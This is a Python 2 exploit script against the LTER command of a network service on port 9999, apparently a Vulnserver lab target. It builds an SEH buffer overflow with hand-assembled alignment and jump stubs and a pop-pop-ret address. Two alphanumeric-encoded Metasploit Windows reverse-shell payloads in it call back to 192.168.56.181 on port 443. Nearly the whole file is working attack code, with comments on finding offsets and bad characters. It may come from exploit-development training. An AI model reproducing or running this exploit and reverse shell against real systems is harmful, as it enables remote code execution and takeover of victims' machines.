#!/usr/bin/env python2
import os, sys, time
from socket import socket, AF_INET, SOCK_STREAM

sploit = "LTER /.:/"
# sploit += "A" * 5004 # crash in SEH:  41414141
# sploit += sys.argv[1]  # ./lter.py $(`locate pattern_create.rb|head -n 1` 5004) # 45336F45 
# `locate pattern_offset.rb |head -n 1` 45336E45 5004  #  3519
# badchars 00, anything above 7F subtracts 7F from result 
sploit += "A" * 32


## Both of the following two payloads work with the current scaffolding.
## However, the msfvenom payload wasn't generated in backtrack, it was generated on bleeding-edge Arch via BlackArch MSF5

defer=""
## BufferRegister=ECX with alpha_mixed fixes the first several byte preamble that's in the non-ascii range, and tells the shellcode what register holds the address of the shellcode's absolute position
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.181 LPORT=443 EXITFUNC=seh BufferRegister=ECX -b "\x00" -e x86/alpha_mixed -i 1 -f c
defer += (
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
"\x38\x41\x42\x75\x4a\x49\x59\x6c\x49\x78\x6b\x32\x33\x30\x37"
"\x70\x57\x70\x63\x50\x6f\x79\x4d\x35\x70\x31\x4f\x30\x73\x54"
"\x6c\x4b\x56\x30\x46\x50\x6c\x4b\x46\x32\x36\x6c\x4c\x4b\x43"
"\x62\x56\x74\x6e\x6b\x70\x72\x47\x58\x34\x4f\x4e\x57\x73\x7a"
"\x61\x36\x66\x51\x59\x6f\x6e\x4c\x75\x6c\x75\x31\x33\x4c\x43"
"\x32\x44\x6c\x65\x70\x49\x51\x4a\x6f\x36\x6d\x66\x61\x38\x47"
"\x78\x62\x39\x62\x73\x62\x30\x57\x6e\x6b\x62\x72\x76\x70\x6e"
"\x6b\x73\x7a\x55\x6c\x4c\x4b\x62\x6c\x66\x71\x52\x58\x39\x73"
"\x30\x48\x56\x61\x4b\x61\x63\x61\x6c\x4b\x30\x59\x67\x50\x66"
"\x61\x39\x43\x4e\x6b\x31\x59\x34\x58\x6b\x53\x67\x4a\x72\x69"
"\x6c\x4b\x76\x54\x4c\x4b\x56\x61\x58\x56\x70\x31\x4b\x4f\x4e"
"\x4c\x4a\x61\x7a\x6f\x36\x6d\x75\x51\x4a\x67\x64\x78\x79\x70"
"\x54\x35\x58\x76\x53\x33\x71\x6d\x58\x78\x37\x4b\x53\x4d\x47"
"\x54\x61\x65\x59\x74\x33\x68\x6c\x4b\x30\x58\x31\x34\x53\x31"
"\x49\x43\x73\x56\x6e\x6b\x56\x6c\x42\x6b\x4e\x6b\x43\x68\x45"
"\x4c\x37\x71\x59\x43\x4e\x6b\x76\x64\x6c\x4b\x57\x71\x4a\x70"
"\x6c\x49\x37\x34\x45\x74\x77\x54\x51\x4b\x53\x6b\x61\x71\x31"
"\x49\x63\x6a\x53\x61\x59\x6f\x4d\x30\x71\x4f\x43\x6f\x73\x6a"
"\x4c\x4b\x44\x52\x38\x6b\x4c\x4d\x53\x6d\x75\x38\x35\x63\x30"
"\x32\x45\x50\x73\x30\x53\x58\x53\x47\x62\x53\x66\x52\x51\x4f"
"\x72\x74\x31\x78\x62\x6c\x42\x57\x71\x36\x67\x77\x6b\x4f\x6b"
"\x65\x6f\x48\x7a\x30\x43\x31\x53\x30\x35\x50\x65\x79\x4b\x74"
"\x43\x64\x50\x50\x45\x38\x36\x49\x6f\x70\x72\x4b\x73\x30\x39"
"\x6f\x39\x45\x66\x30\x52\x70\x50\x50\x72\x70\x61\x50\x66\x30"
"\x51\x50\x30\x50\x31\x78\x39\x7a\x74\x4f\x69\x4f\x6d\x30\x69"
"\x6f\x6b\x65\x6e\x77\x33\x5a\x44\x45\x42\x48\x59\x50\x49\x38"
"\x56\x58\x6f\x45\x65\x38\x47\x72\x67\x70\x56\x61\x6d\x6b\x4f"
"\x79\x4a\x46\x32\x4a\x42\x30\x50\x56\x42\x77\x61\x78\x7a\x39"
"\x59\x35\x52\x54\x63\x51\x6b\x4f\x69\x45\x4f\x75\x39\x50\x30"
"\x74\x46\x6c\x6b\x4f\x42\x6e\x43\x38\x73\x45\x4a\x4c\x32\x48"
"\x4c\x30\x4c\x75\x6e\x42\x46\x36\x49\x6f\x6e\x35\x53\x58\x65"
"\x33\x70\x6d\x62\x44\x35\x50\x4c\x49\x48\x63\x62\x77\x30\x57"
"\x72\x77\x46\x51\x48\x76\x31\x7a\x42\x32\x56\x39\x70\x56\x58"
"\x62\x39\x6d\x50\x66\x38\x47\x71\x54\x67\x54\x75\x6c\x43\x31"
"\x46\x61\x4e\x6d\x57\x34\x76\x44\x46\x70\x6a\x66\x35\x50\x73"
"\x74\x32\x74\x62\x70\x51\x46\x32\x76\x70\x56\x51\x56\x50\x56"
"\x70\x4e\x56\x36\x52\x76\x71\x43\x36\x36\x53\x58\x30\x79\x7a"
"\x6c\x57\x4f\x4b\x36\x59\x6f\x69\x45\x6d\x59\x4b\x50\x30\x4e"
"\x32\x76\x32\x66\x39\x6f\x54\x70\x70\x68\x37\x78\x4e\x67\x47"
"\x6d\x75\x30\x39\x6f\x78\x55\x4f\x4b\x4b\x4e\x34\x4e\x67\x42"
"\x78\x6a\x72\x48\x6e\x46\x4e\x75\x4f\x4d\x6f\x6d\x79\x6f\x6e"
"\x35\x77\x4c\x44\x46\x73\x4c\x76\x6a\x6f\x70\x69\x6b\x69\x70"
"\x62\x55\x36\x65\x4d\x6b\x37\x37\x77\x63\x54\x32\x50\x6f\x70"
"\x6a\x63\x30\x43\x63\x39\x6f\x39\x45\x41\x41"
) # 701

# msfpayload -p windows/shell_reverse_tcp LHOST="192.168.56.181" LPORT=443 EXITFUNC=seh R > shell.raw
# msfencode BufferRegister=ECX -b "\x00" -e x86/alpha_mixed -i shell.raw -t c
sploit += (
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
"\x38\x41\x42\x75\x4a\x49\x59\x6c\x39\x78\x6b\x39\x33\x30\x43"
"\x30\x55\x50\x55\x30\x6f\x79\x38\x65\x56\x51\x48\x52\x45\x34"
"\x6e\x6b\x73\x62\x70\x30\x6e\x6b\x52\x72\x34\x4c\x6c\x4b\x33"
"\x62\x74\x54\x6e\x6b\x51\x62\x66\x48\x76\x6f\x4c\x77\x71\x5a"
"\x64\x66\x56\x51\x69\x6f\x44\x71\x6b\x70\x6c\x6c\x55\x6c\x71"
"\x71\x63\x4c\x35\x52\x34\x6c\x51\x30\x6a\x61\x5a\x6f\x46\x6d"
"\x73\x31\x48\x47\x68\x62\x38\x70\x32\x72\x52\x77\x6c\x4b\x43"
"\x62\x76\x70\x4c\x4b\x52\x62\x37\x4c\x53\x31\x58\x50\x4c\x4b"
"\x71\x50\x42\x58\x6c\x45\x6b\x70\x71\x64\x61\x5a\x73\x31\x38"
"\x50\x62\x70\x6e\x6b\x72\x68\x37\x68\x4c\x4b\x43\x68\x51\x30"
"\x75\x51\x4e\x33\x59\x73\x37\x4c\x67\x39\x6c\x4b\x30\x34\x4e"
"\x6b\x37\x71\x78\x56\x36\x51\x4b\x4f\x45\x61\x6b\x70\x4e\x4c"
"\x59\x51\x58\x4f\x36\x6d\x43\x31\x4b\x77\x46\x58\x39\x70\x42"
"\x55\x6a\x54\x35\x53\x63\x4d\x4b\x48\x35\x6b\x31\x6d\x76\x44"
"\x30\x75\x68\x62\x32\x78\x6c\x4b\x53\x68\x76\x44\x76\x61\x6a"
"\x73\x55\x36\x6c\x4b\x54\x4c\x62\x6b\x4e\x6b\x46\x38\x67\x6c"
"\x53\x31\x79\x43\x6e\x6b\x76\x64\x6e\x6b\x35\x51\x4a\x70\x6e"
"\x69\x67\x34\x76\x44\x64\x64\x33\x6b\x71\x4b\x30\x61\x33\x69"
"\x61\x4a\x62\x71\x69\x6f\x6b\x50\x50\x58\x71\x4f\x42\x7a\x6c"
"\x4b\x35\x42\x78\x6b\x4b\x36\x71\x4d\x33\x58\x35\x63\x36\x52"
"\x73\x30\x73\x30\x33\x58\x71\x67\x64\x33\x36\x52\x51\x4f\x33"
"\x64\x42\x48\x70\x4c\x54\x37\x57\x56\x56\x67\x69\x6f\x4b\x65"
"\x58\x38\x5a\x30\x53\x31\x35\x50\x57\x70\x61\x39\x38\x44\x62"
"\x74\x50\x50\x50\x68\x47\x59\x6b\x30\x70\x6b\x67\x70\x4b\x4f"
"\x69\x45\x32\x70\x36\x30\x50\x50\x42\x70\x73\x70\x50\x50\x33"
"\x70\x50\x50\x62\x48\x6a\x4a\x36\x6f\x79\x4f\x6d\x30\x79\x6f"
"\x5a\x75\x6e\x69\x78\x47\x55\x38\x79\x50\x6c\x68\x65\x68\x4d"
"\x65\x31\x78\x64\x42\x45\x50\x56\x61\x4d\x6b\x6b\x39\x39\x76"
"\x43\x5a\x34\x50\x61\x46\x30\x57\x65\x38\x6c\x59\x6c\x65\x31"
"\x64\x63\x51\x79\x6f\x5a\x75\x33\x58\x52\x43\x62\x4d\x50\x64"
"\x35\x50\x6c\x49\x49\x73\x73\x67\x72\x77\x62\x77\x56\x51\x69"
"\x66\x70\x6a\x65\x42\x51\x49\x73\x66\x39\x72\x69\x6d\x75\x36"
"\x58\x47\x50\x44\x61\x34\x75\x6c\x53\x31\x47\x71\x4c\x4d\x67"
"\x34\x74\x64\x44\x50\x69\x56\x65\x50\x70\x44\x66\x34\x50\x50"
"\x76\x36\x76\x36\x70\x56\x30\x46\x62\x76\x72\x6e\x46\x36\x32"
"\x76\x66\x33\x31\x46\x65\x38\x42\x59\x4a\x6c\x67\x4f\x6f\x76"
"\x39\x6f\x6b\x65\x6b\x39\x49\x70\x62\x6e\x52\x76\x37\x36\x39"
"\x6f\x74\x70\x71\x78\x66\x68\x4e\x67\x77\x6d\x53\x50\x59\x6f"
"\x4b\x65\x4d\x6b\x4b\x4e\x46\x6e\x34\x72\x4a\x4a\x65\x38\x6d"
"\x76\x4c\x55\x4d\x6d\x6f\x6d\x59\x6f\x58\x55\x77\x4c\x37\x76"
"\x71\x6c\x34\x4a\x4b\x30\x4b\x4b\x59\x70\x34\x35\x65\x55\x6d"
"\x6b\x51\x57\x62\x33\x70\x72\x62\x4f\x70\x6a\x33\x30\x50\x53"
"\x59\x6f\x69\x45\x41\x41"
) # 681


sploit += "A" * (3519 - 32 - 681 - 4 - 126)

sploit += "\x54\x58" # push esp pop eax

##  Extremely important that ESP is aligned to four-byte boundaries
##  Just make sure that any targeted offset to the original is dividable by four
##  echo "ibase=16;obase=A;01FFFFC0 - 01FFECB8" |bc | echo "ibase=10;scale=2;$(cat -)/4" |bc
##  1218.00  ## aligned
# 01E5FF48   66:25 0101       AND AX,101
# 01E5FF4C   66:25 0202       AND AX,202
# 01E3FF50   66:05 7F7F       ADD AX,7F7F
# 01E3FF54   66:05 407F       ADD AX,7F40
# 01E3FF58   66:05 0501       ADD AX,105
# 01E3FF5C   50               PUSH EAX
# 01E3FF5D   5C               POP ESP
sploit += "\x66\x25\x01\x01\x66\x25\x02\x02\x66\x05\x7f\x7f\x66\x05\x40\x7f\x66\x05\x05\x01\x50\x5c"

## target: beginning of shellcode, AX relative offset to new ESP
# 01D0FF5E   66:2D 7F02       SUB AX,27F
# 01D0FF62   66:2D 3c0B       SUB AX,0b3c
# $-62     > 50               PUSH EAX
# $-61     > 59               POP ECX
sploit += "\x66\x2d\x7f\x02\x66\x2d\x3c\x0b\x50\x59"

##  JMP ECX = \xff\xe1
##  target = \x43\x43\xff\xe1  0xe1ff4343
# 01E9FF64   25 01010101      AND EAX,1010101
# 01E9FF69   25 02020202      AND EAX,2020202
# 01E9FF6E   2D 7F7F7F7F      SUB EAX,7F7F7F7F
# 01E9FF73   2D 7F7F017F      SUB EAX,7F017F7F
# 01E9FF78   2D 7F7F7F1F      SUB EAX,1F7F7F7F
# 01E9FF7D   66:2D 403E       SUB AX,3E40
# 01E9FF81   50               PUSH EAX
sploit += "\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2D\x7F\x7F\x7F\x7F\x2D\x7F\x7F\x01\x7F\x2D\x7F\x7F\x7F\x1F\x66\x2D\x40\x3E\x50"


sploit += "C" * (126 -2 - 8 - 14 - 10 - 30)
# \x74 = JN/JE  (ZF=1)
sploit += "\x74\xFF" + "\x41\x41"
# 6250120B  59  POP ECX
# 6250120C  59  POP ECX
# 6250120D  C3  RETN
sploit += "\x0b\x12\x50\x62" # pop pop ret
sploit += "C" * (5004 - 3519 - 4)
sploit += "\r\n"


cx = socket(AF_INET,SOCK_STREAM)
cx.connect(("192.168.56.8",9999))
cx.send(sploit)
cx.close()
